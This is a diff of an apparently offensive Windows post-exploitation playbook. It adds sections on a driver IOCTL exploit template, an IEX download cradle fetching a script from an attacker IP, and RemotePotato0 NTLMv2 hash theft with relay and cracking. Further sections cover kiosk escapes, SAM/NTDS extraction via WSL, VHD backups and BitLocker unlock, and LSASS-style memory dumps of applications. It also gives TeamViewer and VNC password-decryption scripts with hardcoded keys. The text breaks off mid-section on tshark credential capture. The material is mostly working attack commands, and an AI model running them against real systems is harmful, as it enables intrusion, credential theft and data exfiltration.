+#define IOCTL_CODE <DISCOVERED_IOCTL_CODE>  // e.g., 0x9C402420
+
+int main() {
+    HANDLE hDevice = CreateFileW(L"\\\\.\\<DEVICE_NAME>", GENERIC_READ | GENERIC_WRITE,
+                                  0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        printf("[-] Cannot open device: %d\n", GetLastError());
+        return 1;
+    }
+    printf("[+] Device handle obtained\n");
+
+    // Craft input buffer per RE findings
+    BYTE inBuf[0x100] = {0};
+    BYTE outBuf[0x100] = {0};
+    DWORD bytesReturned = 0;
+
+    // Populate inBuf based on Ghidra-identified structure
+    // e.g., *(PULONG64)(inBuf) = targetAddress; *(PULONG64)(inBuf+8) = value;
+
+    BOOL result = DeviceIoControl(hDevice, IOCTL_CODE, inBuf, sizeof(inBuf),
+                                   outBuf, sizeof(outBuf), &bytesReturned, NULL);
+    if (result) {
+        printf("[+] IOCTL succeeded, bytes returned: %d\n", bytesReturned);
+    } else {
+        printf("[-] IOCTL failed: %d\n", GetLastError());
+    }
+    CloseHandle(hDevice);
+    return 0;
+}
+```
+
+```bash
+# Cross-compile on Kali
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# PowerShell P/Invoke to call DeviceIoControl without compiling on target
+$code = @'
+using System;
+using System.Runtime.InteropServices;
+public class Driver {
+    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, byte[] lpInBuffer, uint nInBufferSize, byte[] lpOutBuffer, uint nOutBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);
+    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
+}
+'@
+Add-Type $code
+$h = [Driver]::CreateFile("\\.\<DEVICE_NAME>", 0xC0000000, 0, [IntPtr]::Zero, 3, 0, [IntPtr]::Zero)
+$inBuf = New-Object byte[] 256
+$outBuf = New-Object byte[] 256
+$ret = [uint32]0
+[Driver]::DeviceIoControl($h, <IOCTL_CODE>, $inBuf, 256, $outBuf, 256, [ref]$ret, [IntPtr]::Zero)
+[Driver]::CloseHandle($h)
+```
+
 ---
 
 ### 4.21d DiagHub StandardCollectorService — Arbitrary-Write-to-System32 → SYSTEM
@@ -2977,6 +3630,97 @@ Get-ADUser <USER> -Properties memberOf
 > **Why not CredSSP / `Enable-WSManCredSSP`?** Works but requires a second authentication factor and changes WinRM config on both hosts (visible artifact, breaks back). Type 9 with RunasCs is artifact-light and reverts the moment the shell exits.
 
 > **AppLocker / Defender will flag `RunasCs.exe`.** Rename the binary (`RunasCs.exe` is on Defender's signature list) and consider an in-memory load via reflection — see [av-evasion.md](av-evasion.md) and [windows-methodology.md §4.10 AMSI & ETW Bypass](#410-amsi-etw-bypass-critical-for-powershell-tooling).
+
+#### 4.23b Credential Manager Dump from Network-Logon Shell (RunasCs -ForceProfile)
+
+When your shell is a type-3 network logon (Evil-WinRM, wmiexec, psexec), the user's DPAPI-protected Credential Manager entries are inaccessible because the profile is not loaded. Use `RunasCs` with `-ForceProfile` to spawn an interactive (type-2) logon that loads the user profile and DPAPI master keys, then dump Credential Manager.
+
+```powershell
+# Confirm current shell cannot read CredMan (returns empty or access denied)
+cmdkey /list
+# Expected: "Currently stored credentials: * NONE *" even though creds exist
+
+# Spawn interactive logon with profile loaded — enables DPAPI decryption
+.\RunasCs.exe <USER> <PASSWORD> "powershell.exe -NoProfile" -l 2 --force-profile
+
+# Inside the new shell — Credential Manager is now accessible
+cmdkey /list
+# Should show TERMSRV/<HOST>, Domain:target=<DOMAIN>\<USER>, etc.
+
+# Invoke-WCMDump — enumerate and decrypt Windows Credential Manager entries
+# https://github.com/peewpw/Invoke-WCMDump
+IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-WCMDump.ps1')
+Invoke-WCMDump
+
+# Alternative: SharpDPAPI credentials (same user context with profile loaded)
+.\SharpDPAPI.exe credentials
+.\SharpDPAPI.exe vaults
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# Native Credential Manager read via VaultCli (no external tools, profile must be loaded)
+# First spawn type-2 session via RunasCs as above, then:
+VaultCmd /listcreds:"Windows Credentials" /all
+VaultCmd /listcreds:"Web Credentials" /all
+
+# CredentialManager PowerShell module (built into recent Windows)
+Get-StoredCredential -Type Generic -AsCredentialObject
+# Falls back to: cmdkey /list + runas /savecred for exploitation
+```
+
+### 4.23c Cross-Session NTLMv2 Hash Steal via RemotePotato0
+
+When another user (often a DA) has an active session on the same host, `RemotePotato0` abuses DCOM cross-session activation to coerce their session into authenticating to an attacker-controlled HTTP listener, leaking their NTLMv2 hash without touching LSASS.
+
+```powershell
+# === Prerequisite: enumerate logged-on sessions ===
+query user
+qwinsta
+# Look for sessions belonging to high-value accounts (DA, service accounts)
+
+# Confirm you do NOT have SeImpersonate (otherwise use GodPotato instead)
+whoami /priv
+```
+
+```bash
+# === Attacker side: start ntlmrelayx or socat listener to capture the hash ===
+# Option 1: ntlmrelayx in server-only mode (captures NTLMv2)
+impacket-ntlmrelayx --no-http-server -smb2support -t <RELAY_TARGET> -c "whoami"
+# Option 2: Responder on attacker interface
+sudo responder -I <INTERFACE>
+```
+
+```powershell
+# === On target: run RemotePotato0 ===
+# https://github.com/antonioCoco/RemotePotato0
+# -m 2 = capture NTLMv2 hash (no relay)
+# -s <SESSION_ID> = target session from qwinsta output
+.\RemotePotato0.exe -m 2 -r <ATTACKER_IP> -x <ATTACKER_PORT> -p <LOCAL_LISTENER_PORT> -s <SESSION_ID>
+
+# Simplified mode — target the first non-current session automatically
+.\RemotePotato0.exe -m 2 -r <ATTACKER_IP> -x <ATTACKER_PORT> -p 9999
+```
+
+```bash
+# === Crack the captured NTLMv2 hash ===
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# No pure LOTL equivalent — DCOM cross-session activation requires the RemotePotato0 binary.
+# Closest native approach: if you have local admin, use WMI to query logged-on users
+# and then attempt token impersonation via named pipes (requires SeImpersonate).
+Get-WmiObject Win32_LogonSession | Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 } |
+  ForEach-Object {
+    $user = Get-WmiObject -Query "ASSOCIATORS OF {Win32_LogonSession.LogonId=$($_.LogonId)} WHERE AssocClass=Win32_LoggedOnUser" -ErrorAction SilentlyContinue
+    if ($user) { Write-Output "Session $($_.LogonId): $($user.Domain)\$($user.Name) (Type $($_.LogonType))" }
+  }
+# For the actual hash steal, RemotePotato0.exe is unavoidable.
+```
 
 ### 4.24 Internal Service Enumeration (Post-Foothold)
 ```powershell
@@ -3291,6 +4035,736 @@ bash -c "grep -RInE 'password|passwd|secret|api[_-]?key|token' /root /home /etc 
 
 ---
 
+### 4.28b WSL Network-Facing SSH as External Entry Point
+
+When nmap discovers SSH on a nonstandard port (e.g., 2222) reaching a WSL instance, an SSH key recovered from a Windows share or user profile grants Linux access. From inside WSL, `/mnt/c` exposes the entire Windows filesystem including SAM hives, NTDS.dit backups, and user profiles.
+
+```bash
+# Discover nonstandard SSH during port scan
+nmap -p- --min-rate 5000 -Pn <TARGET> | grep open
+# Example: 2222/tcp open  EtherNetIP-1
+
+# Banner grab to confirm WSL/Ubuntu
+nmap -p 2222 -sV -Pn <TARGET>
+# OpenSSH on Ubuntu = likely WSL
+
+# SSH in with recovered key from Windows share loot
+ssh -i <RECOVERED_KEY> -p 2222 <USER>@<TARGET>
+
+# Inside WSL — access Windows C: drive via /mnt/c
+ls -la /mnt/c/Users/
+cat /mnt/c/Users/<ADMIN>/Desktop/*.txt
+cat /mnt/c/Windows/System32/config/SAM       # readable if running as root in WSL
+cat /mnt/c/Windows/NTDS/ntds.dit             # if DC backup exists
+
+# Copy SAM/SYSTEM for offline extraction
+cp /mnt/c/Windows/System32/config/SAM /tmp/SAM
+cp /mnt/c/Windows/System32/config/SYSTEM /tmp/SYSTEM
+# Exfil to attacker, then:
+# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# From inside WSL — no tools needed beyond standard coreutils
+find /mnt/c/Users -name "*.kdbx" -o -name "*.rdg" -o -name "id_rsa" -o -name "*.pfx" 2>/dev/null
+grep -rIl "password\|secret\|apikey" /mnt/c/Users/ 2>/dev/null | head -20
+cat /mnt/c/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt 2>/dev/null
+```
+
+### 4.28c Windows Kiosk / Restricted-Shell Escape via Browser file:// Scheme
+
+When landing on a kiosk, thin-client, or RDP session with a restricted desktop (only specific apps allowed), the browser `file://` URI scheme provides filesystem access that can be pivoted to code execution.
+
+```
+# === Browser-based escape (works in IE, Edge, Chrome in kiosk mode) ===
+# Type in address bar:
+file:///C:/Windows/System32/
+# Navigate to cmd.exe or powershell.exe, right-click → Open
+
+# Direct path to shell:
+file:///C:/Windows/System32/cmd.exe
+file:///C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
+
+# If exe execution is blocked, try script hosts:
+file:///C:/Windows/System32/cscript.exe
+file:///C:/Windows/System32/wscript.exe
+file:///C:/Windows/System32/mshta.exe
+```
+
+```cmd
+:: === Alternative escape vectors from restricted desktop ===
+
+:: Help menu escape — many apps have Help > Contents that opens a CHM/browser
+:: Inside the help browser: right-click > View Source / Print > opens Notepad/dialog
+:: File > Open dialog acts as a file browser — navigate to cmd.exe, type *.exe in filename field
+
+:: Ctrl+Shift+Esc → Task Manager (if not blocked) → File > Run new task > cmd.exe
+
+:: Win+R (Run dialog) — type: cmd.exe, powershell.exe, or \\<ATTACKER_IP>\share\nc.exe
+
+:: Explorer shell via shortcut creation:
+:: Right-click desktop > New > Shortcut > type: cmd.exe > finish > double-click
+
+:: Sticky keys at login screen (if RDP access):
+:: Press Shift 5 times at login → if sethc.exe is replaced, drops to shell
+
+:: Print dialog escape:
+:: Any app > File > Print > Microsoft Print to PDF or XPS > outputs .pdf
+:: But "Print to File" path field allows navigating filesystem
+:: Type: C:\Windows\System32\cmd.exe in the filename field > press Enter
+
+:: Office apps (if available):
+:: Open macro-enabled doc > Alt+F11 (VBA editor) > Shell "cmd.exe"
+:: Or: =EXEC("cmd.exe") in Excel (if macros enabled)
+```
+
+```powershell
+# === Process allowlist bypass ===
+# If AppLocker blocks cmd.exe/powershell.exe by name, use alternate paths:
+C:\Windows\Sysnative\cmd.exe
+C:\Windows\SysWOW64\cmd.exe
+C:\Windows\WinSxS\*\cmd.exe
+# Or LOLBins that spawn shells:
+C:\Windows\System32\bash.exe           # WSL bash
+C:\Windows\System32\OpenSSH\ssh.exe    # SSH to attacker → reverse tunnel back
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: All techniques above are LOTL by definition — no tools needed.
+:: Priority escape order:
+:: 1. file:///C:/Windows/System32/cmd.exe in browser address bar
+:: 2. Win+R → cmd.exe
+:: 3. Help menu → View Source → opens Notepad/browser with file access
+:: 4. Task Manager → Run new task → cmd.exe
+:: 5. Ctrl+O (Open dialog) in any app → type cmd.exe in filename → Enter
+```
+
+### 4.28d Windows Recycle Bin File Recovery (Post-Ex Loot from Deleted Files)
+
+Users delete sensitive files (cred sheets, configs, scripts) thinking they are gone. The `$Recycle.Bin` directory retains them until emptied. Each deleted file is stored as a `$R` (content) + `$I` (metadata) pair under the user's SID folder.
+
+```powershell
+# === Enumerate Recycle Bin contents for all users (requires admin or SeBackupPrivilege) ===
+Get-ChildItem 'C:\$Recycle.Bin' -Force -Recurse -ErrorAction SilentlyContinue |
+  Where-Object { $_.Name -match '^\$R' } |
+  Select-Object FullName, Length, LastWriteTime | Sort-Object LastWriteTime -Descending
+
+# Current user's recycle bin only (no admin needed)
+$shell = New-Object -ComObject Shell.Application
+$recycleBin = $shell.NameSpace(0x0A)  # 0x0A = Recycle Bin namespace
+$recycleBin.Items() | ForEach-Object {
+    [PSCustomObject]@{
+        Name = $_.Name
+        Path = $_.Path
+        Size = $_.Size
+        DateDeleted = $recycleBin.GetDetailsOf($_, 2)
+        OriginalLocation = $recycleBin.GetDetailsOf($_, 1)
+    }
+}
+
+# Recover a specific file from Recycle Bin to a working directory
+Copy-Item 'C:\$Recycle.Bin\<USER_SID>\$R<HASH>' -Destination 'C:\Windows\Temp\recovered_file.txt'
+```
+
+```cmd
+:: cmd.exe — list deleted files (admin or owner context)
+dir /a /s C:\$Recycle.Bin\
+
+:: Identify file by looking at $I metadata (first 8 bytes = header, then original path in Unicode)
+:: Copy $R file to working dir for inspection
+copy "C:\$Recycle.Bin\<USER_SID>\$R<HASH>" C:\Windows\Temp\recovered.bin
+```
+
+```powershell
+# === Mass recovery — copy all deleted files for triage ===
+New-Item -ItemType Directory -Path 'C:\Windows\Temp\recycle_loot' -Force
+Get-ChildItem 'C:\$Recycle.Bin' -Force -Recurse -ErrorAction SilentlyContinue |
+  Where-Object { $_.Name -match '^\$R' -and $_.Length -gt 0 } |
+  ForEach-Object { Copy-Item $_.FullName "C:\Windows\Temp\recycle_loot\$($_.Name)_$($_.Directory.Name)" }
+
+# Then scan for credentials
+Get-ChildItem 'C:\Windows\Temp\recycle_loot' |
+  Select-String -Pattern 'password|secret|apikey|connectionstring' -List
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Pure cmd.exe — no PowerShell, no tools
+dir /a /s C:\$Recycle.Bin\ 2>nul
+:: Copy interesting files by size/extension
+for /R C:\$Recycle.Bin %f in ($R*) do @if %~zf GTR 100 copy "%f" C:\Windows\Temp\recycle_loot\ >nul 2>&1
+```
+
+### 4.28e VHD / VHDX Backup Image Mounting and Offline Filesystem Extraction
+
+Windows backup solutions (Windows Server Backup, Veeam, SCDPM) produce VHD/VHDX disk images. When found on shares or locally, mount them to extract SAM/SYSTEM hives, NTDS.dit, or sensitive files without triggering live-system credential-dumping detections.
+
+```powershell
+# === Windows (admin) — native Mount-DiskImage ===
+# Find VHD/VHDX files
+Get-ChildItem -Path C:\,E:\,F:\ -Recurse -Include *.vhd,*.vhdx -ErrorAction SilentlyContinue | Select FullName, Length, LastWriteTime
+
+# Common backup locations
+dir /s /b C:\WindowsImageBackup\*.vhd 2>nul
+dir /s /b \\<FILE_SERVER>\Backups\*.vhdx 2>nul
+
+# Mount the VHD (assigns a drive letter)
+Mount-DiskImage -ImagePath 'C:\WindowsImageBackup\<HOST>\Backup*\<GUID>.vhdx' -PassThru | Get-Disk | Get-Partition | Get-Volume
+
+# Or via diskpart (works on older OS)
+# diskpart
+# select vdisk file="C:\path\to\backup.vhdx"
+# attach vdisk readonly
+# list volume
+# exit
+
+# After mounting — extract SAM/SYSTEM/SECURITY for offline hash dump
+copy E:\Windows\System32\config\SAM C:\Windows\Temp\SAM
+copy E:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
+copy E:\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY
+
+# On a DC backup — extract NTDS.dit
+copy E:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+
+# Dismount when done
+Dismount-DiskImage -ImagePath 'C:\WindowsImageBackup\<HOST>\Backup*\<GUID>.vhdx'
+```
+
+```bash
+# === Linux (attacker box) — after exfiltrating the VHD/VHDX ===
+# guestmount (libguestfs — handles VHD/VHDX/VMDK/QCOW2)
+sudo apt install -y libguestfs-tools
+sudo mkdir /mnt/vhd
+sudo guestmount -a backup.vhdx -m /dev/sda1 --ro /mnt/vhd
+ls /mnt/vhd/Windows/System32/config/
+sudo cp /mnt/vhd/Windows/System32/config/{SAM,SYSTEM,SECURITY} ./
+sudo guestunmount /mnt/vhd
+
+# qemu-nbd alternative
+sudo modprobe nbd max_part=8
+sudo qemu-nbd -r -c /dev/nbd0 backup.vhdx
+sudo mount -o ro /dev/nbd0p1 /mnt/vhd
+sudo cp /mnt/vhd/Windows/System32/config/{SAM,SYSTEM,SECURITY} ./
+sudo umount /mnt/vhd && sudo qemu-nbd -d /dev/nbd0
+
+# Extract hashes offline
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+# For NTDS.dit:
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Windows native — diskpart (no PowerShell needed, works on Server 2008+)
+echo select vdisk file="C:\WindowsImageBackup\<HOST>\<GUID>.vhdx" > %TEMP%\vhd.txt
+echo attach vdisk readonly >> %TEMP%\vhd.txt
+echo exit >> %TEMP%\vhd.txt
+diskpart /s %TEMP%\vhd.txt
+:: Find the new drive letter with 'wmic logicaldisk list brief'
+:: Copy hives, then detach:
+echo select vdisk file="C:\WindowsImageBackup\<HOST>\<GUID>.vhdx" > %TEMP%\dvhd.txt
+echo detach vdisk >> %TEMP%\dvhd.txt
+echo exit >> %TEMP%\dvhd.txt
+diskpart /s %TEMP%\dvhd.txt
+```
+
+### 4.28f BitLocker Locked-Volume Unlock with Recovery Key
+
+When a BitLocker recovery key is found (AD attribute `ms-FVE-RecoveryPassword`, GPO backup, printed key document, or user's Microsoft account), use it to unlock encrypted volumes on the same or different host.
+
+```powershell
+# === Find BitLocker status on current system ===
+manage-bde -status
+Get-BitLockerVolume | Format-Table MountPoint, VolumeStatus, EncryptionMethod, KeyProtector
+
+# === Unlock a locked volume with known recovery key ===
+# Recovery key format: 6 groups of 6 digits separated by dashes
+manage-bde -unlock D: -RecoveryPassword <XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX>
+
+# PowerShell equivalent
+Unlock-BitLocker -MountPoint "D:" -RecoveryPassword "<RECOVERY_KEY>"
+
+# === Unlock with recovery key file (.bek) ===
+manage-bde -unlock D: -RecoveryKey "C:\path\to\recovery.bek"
+
+# After unlock — access the volume normally
+dir D:\Windows\System32\config\
+copy D:\Windows\System32\config\SAM C:\temp\SAM
+```
+
+```bash
+# === Linux — unlock BitLocker volumes with dislocker ===
+sudo apt install -y dislocker
+# With recovery password
+sudo dislocker -r -V /dev/sda2 -p<XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX> -- /mnt/bitlocker
+sudo mount -o ro /mnt/bitlocker/dislocker-file /mnt/windows
+ls /mnt/windows/Windows/System32/config/
+
+# With .bek file
+sudo dislocker -r -V /dev/sda2 -k /path/to/recovery.bek -- /mnt/bitlocker
+sudo mount -o ro /mnt/bitlocker/dislocker-file /mnt/windows
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: manage-bde is native on all BitLocker-capable Windows (Pro/Enterprise/Server)
+manage-bde -status
+manage-bde -unlock E: -RecoveryPassword <RECOVERY_KEY>
+:: After unlock, copy hives directly
+copy E:\Windows\System32\config\SAM C:\temp\SAM
+copy E:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+```
+
+### 4.28g Application Process Memory + LevelDB Mining for Cleartext Secrets
+
+Beyond LSASS, user-mode applications (Electron apps, KeePass, Putty, Slack, Discord, browser processes) hold cleartext credentials in heap memory. LevelDB/IndexedDB on-disk stores persist unencrypted session data.
+
+```powershell
+# === Dump arbitrary user-process memory with procdump ===
+# Identify interesting processes
+Get-Process | Where-Object { $_.ProcessName -match 'keepass|putty|slack|discord|teams|firefox|chrome|outlook|filezilla|mremoteng|mobaxterm' } |
+  Select-Object Id, ProcessName, Path
+
+# Dump target process (Sysinternals procdump — signed, less likely blocked than mimikatz)
+procdump.exe -accepteula -ma <PID> C:\Windows\Temp\<PROCESS_NAME>.dmp
+
+# Strings search on the dump for credentials
+strings -a -n 8 C:\Windows\Temp\<PROCESS_NAME>.dmp | findstr /i "password passwd pwd user= uid= smtp:// ftp:// http"
+```
+
+```powershell
+# === On-target PowerShell — dump and grep without procdump ===
+# .NET MiniDumpWriteDump via comsvcs.dll (same technique as LSASS dump, different PID)
+$pid = (Get-Process -Name '<TARGET_PROCESS>').Id
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\app.dmp full
+```
+
+```bash
+# === Offline analysis on attacker box ===
+strings -a -n 8 app.dmp | grep -iE 'password|passwd|pwd|secret|token|api.key|smtp|ftp|ssh'
+strings -a -e l -n 8 app.dmp | grep -iE 'password|passwd|pwd'  # UTF-16LE (Windows wide strings)
+```
+
+```powershell
+# === LevelDB / IndexedDB on-disk store mining ===
+# Electron apps (Slack, Discord, Teams, VSCode) store data in LevelDB
+Get-ChildItem "$env:APPDATA" -Recurse -Filter *.ldb -ErrorAction SilentlyContinue | Select FullName
+Get-ChildItem "$env:LOCALAPPDATA" -Recurse -Filter *.ldb -ErrorAction SilentlyContinue | Select FullName
+
+# Grep LevelDB files for secrets (plaintext strings embedded in binary format)
+Get-ChildItem "$env:APPDATA\discord\Local Storage\leveldb" -Filter *.ldb -ErrorAction SilentlyContinue |
+  ForEach-Object { Select-String -Path $_.FullName -Pattern 'token|password|mfa\.' -AllMatches }
+
+# Chrome/Edge IndexedDB (cookie jars, session storage)
+Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\IndexedDB" -Recurse -Filter *.ldb |
+  ForEach-Object { Select-String -Path $_.FullName -Pattern 'password|token|session' -AllMatches }
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: comsvcs.dll dump is fully native (no procdump upload needed)
+:: Get PID first:
+tasklist | findstr /i "keepass putty slack"
+:: Dump:
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\app.dmp full
+:: Grep (findstr on binary files — limited but works for ASCII strings):
+findstr /s /i "password passwd secret token" C:\Windows\Temp\app.dmp
+```
+
+### 4.28h Windows Event Log (.evtx) Offline Analysis for Credential Recovery
+
+Exported or exfiltrated `.evtx` files contain cleartext credentials from 4688 command-line logging and the classic 4625 pattern where users accidentally type their password in the username field during failed logon.
+
+```powershell
+# === On-target: export Security log to file (Event Log Readers or admin) ===
+wevtutil epl Security C:\Windows\Temp\security.evtx
+
+# === On-target: quick 4625 hunt (password-in-username-field pattern) ===
+Get-WinEvent -Path 'C:\Windows\Temp\security.evtx' -FilterHashtable @{Id=4625} |
+  Select-Object TimeCreated, @{n='TargetUser';e={$_.Properties[5].Value}},
+    @{n='Workstation';e={$_.Properties[13].Value}},
+    @{n='FailReason';e={$_.Properties[7].Value}} |
+  Where-Object { $_.TargetUser -notmatch '^(SYSTEM|-|DWM-|UMFD-)' } |
+  Sort-Object TargetUser -Unique | Format-Table
+# TargetUser values that look like passwords (special chars, mixed case, long) = leaked creds
+
+# === 4688 command-line credential extraction ===
+Get-WinEvent -Path 'C:\Windows\Temp\security.evtx' -FilterHashtable @{Id=4688} |
+  Where-Object { $_.Message -match '/p:|-Password |/pass:|ConvertTo-SecureString' } |
+  Select-Object TimeCreated, @{n='Cmd';e={($_.Message -split "`n" | Select-String 'Command Line').Line}} |
+  Format-Table -Wrap
+```
+
+```bash
+# === Linux offline analysis with chainsaw (fast EVTX parser + Sigma rules) ===
+# https://github.com/WithSecureLabs/chainsaw
+chainsaw hunt security.evtx -s /path/to/sigma/rules/ --mapping chainsaw/mappings/sigma-event-logs-all.yml
+
+# === evtx_dump — convert to JSON for jq processing ===
+# https://github.com/omerbenamram/evtx
+evtx_dump -o json security.evtx | jq 'select(.Event.System.EventID == 4625) | .Event.EventData.TargetUserName' | sort -u
+
+# 4688 command-line extraction
+evtx_dump -o json security.evtx | jq 'select(.Event.System.EventID == 4688) | .Event.EventData.CommandLine' | grep -iE 'pass|pwd|secret'
+
+# === hayabusa — timeline + credential-pattern detection ===
+# https://github.com/Yamato-Security/hayabusa
+hayabusa csv-timeline -d . -o timeline.csv
+grep -i "password\|credential" timeline.csv
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: wevtutil native — export + text search without PowerShell
+wevtutil epl Security %TEMP%\sec.evtx
+wevtutil qe %TEMP%\sec.evtx /q:"*[System[(EventID=4625)]]" /f:text > %TEMP%\4625.txt
+findstr /i "Account Name" %TEMP%\4625.txt | sort | uniq
+:: Look for entries where "Account Name" looks like a password string
+```
+
+### 4.28i TeamViewer Unattended Password Decryption (CVE-2019-18988)
+
+TeamViewer stores unattended access passwords in the registry encrypted with a static AES-128-CBC key. Any local user can read the encrypted blob; the key is hardcoded in the binary.
+
+```powershell
+# === Read encrypted password from registry ===
+# TeamViewer 7-14 (32-bit registry path on 64-bit OS uses WoW6432Node)
+reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v SecurityPasswordAES 2>nul
+reg query "HKLM\SOFTWARE\TeamViewer" /v SecurityPasswordAES 2>nul
+
+# TeamViewer 9+ also stores:
+reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v OptionsPasswordAES 2>nul
+reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v SecurityPasswordExported 2>nul
+reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v ServerPasswordAES 2>nul
+
+# Also check HKCU for per-user installs
+reg query "HKCU\SOFTWARE\TeamViewer" /s 2>nul | findstr /i "PasswordAES"
+```
+
+```python3
+# === Decrypt on attacker box (static AES key from CVE-2019-18988) ===
+# Key:  0602000000a400005253413100040000
+# IV:   0100010067244F436E6762F25EA8D704
+import sys
+from Crypto.Cipher import AES
+
+key = bytes.fromhex("0602000000a400005253413100040000")
+iv  = bytes.fromhex("0100010067244F436E6762F25EA8D704")
+# Paste the hex blob from SecurityPasswordAES registry value:
+encrypted = bytes.fromhex("<HEX_BLOB_FROM_REGISTRY>")
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+decrypted = cipher.decrypt(encrypted)
+password = decrypted.decode('utf-16-le').rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10')
+print(f"[+] TeamViewer Password: {password}")
+```
+
+```bash
+# Metasploit module (post-exploitation)
+# msfconsole → use post/windows/gather/credentials/teamviewer_passwords
+# set SESSION <id> → run
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# Read the registry blob natively — decryption still requires Python/tool on attacker side
+$val = (Get-ItemProperty 'HKLM:\SOFTWARE\WOW6432Node\TeamViewer' -Name SecurityPasswordAES -ErrorAction SilentlyContinue).SecurityPasswordAES
+if ($val) { Write-Output "[+] TeamViewer SecurityPasswordAES: $([BitConverter]::ToString($val) -replace '-','')" }
+# Exfil the hex string to attacker box for decryption with the script above
+```
+
+### 4.28j TightVNC / VNC Registry Password Decryption (Fixed DES Key)
+
+VNC servers (TightVNC, RealVNC, UltraVNC) store the access password encrypted with a well-known fixed DES key (`\x17\x52\x6B\x06\x23\x4E\x58\x07`). Extract from registry, decrypt offline.
+
+```powershell
+# === Read encrypted VNC password from registry ===
+# TightVNC
+reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password 2>nul
+reg query "HKLM\SOFTWARE\TightVNC\Server" /v PasswordViewOnly 2>nul
+reg query "HKCU\SOFTWARE\TightVNC\Server" /v Password 2>nul
+
+# RealVNC (4.x stores in HKLM, 5+ in HKCU)
+reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul
+reg query "HKCU\SOFTWARE\RealVNC\VNCServer" /v Password 2>nul
+
+# UltraVNC
+reg query "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v Password 2>nul
+reg query "HKLM\SOFTWARE\ORL\WinVNC\Default" /v Password 2>nul
+
+# UltraVNC ini file (alternative storage)
+type "C:\Program Files\UltraVNC\ultravnc.ini" 2>nul | findstr /i "passwd"
+```
+
+```bash
+# === Decrypt with the fixed DES key on attacker box ===
+# Using vncpwd (https://github.com/jeroennijhof/vncpwd) or msfconsole
+echo '<HEX_BLOB>' | xxd -r -p > vnc_encrypted.bin
+
+# Python3 decryption (DES ECB, key bits reversed per byte)
+python3 -c "
+import sys
+from Crypto.Cipher import DES
+key = bytes([23,82,107,6,35,78,88,7])  # 0x17,0x52,0x6B,0x06,0x23,0x4E,0x58,0x07
+enc = bytes.fromhex('$1')  # paste hex blob
+cipher = DES.new(key, DES.MODE_ECB)
+print(cipher.decrypt(enc).rstrip(b'\x00').decode())
+" '<HEX_BLOB>'
+
+# Metasploit post module
+# use post/windows/gather/credentials/vnc → set SESSION <id> → run
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Registry read is native — decryption requires Python/tool on attacker side
+reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
+reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
+:: Exfil the hex value to attacker for decryption
+```
+
+### 4.28k Wireshark / tshark Credential Extraction from Network Traffic
+
+Capture cleartext credentials from protocols that transmit in plain (LDAP simple-bind, FTP, HTTP Basic, SMTP AUTH, Telnet, POP3, IMAP) using Wireshark or tshark on a compromised host with network visibility.
+
+```bash
+# === Capture on target (Windows or Linux pivot host) ===
+# tshark — capture to pcap (run as admin/root)
+tshark -i <INTERFACE> -w /tmp/capture.pcap -f "port 21 or port 25 or port 80 or port 110 or port 143 or port 389 or port 23"
+
+# Time-limited capture (120 seconds)
+tshark -i <INTERFACE> -a duration:120 -w /tmp/capture.pcap
+```
+
+```bash
+# === Extract credentials with tshark display filters (offline on attacker) ===
+
+# LDAP simple-bind (port 389 unencrypted)
